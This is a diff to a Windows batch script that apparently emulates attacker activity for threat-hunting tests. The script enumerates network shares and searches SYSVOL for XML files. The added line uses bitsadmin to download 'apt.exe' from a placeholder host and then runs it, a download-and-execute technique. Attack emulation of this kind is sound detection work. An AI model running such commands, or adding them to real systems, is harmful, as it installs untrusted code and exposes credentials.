@@ -475,6 +475,8 @@ start /b cmd /c dir /b /s \\nas\users_home_share$ ^> shareinfo.txt
 ECHO ============================
 dir \\abc.local\sysvol\*.xml /a-d /s
 ECHO ============================
+cmd.exe /c bitsadmin /transfer TW /priority foreground https://example.com/apt.exe %USERPROFILE%\apt.exe && start %USERPROFILE%\apt.exe
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
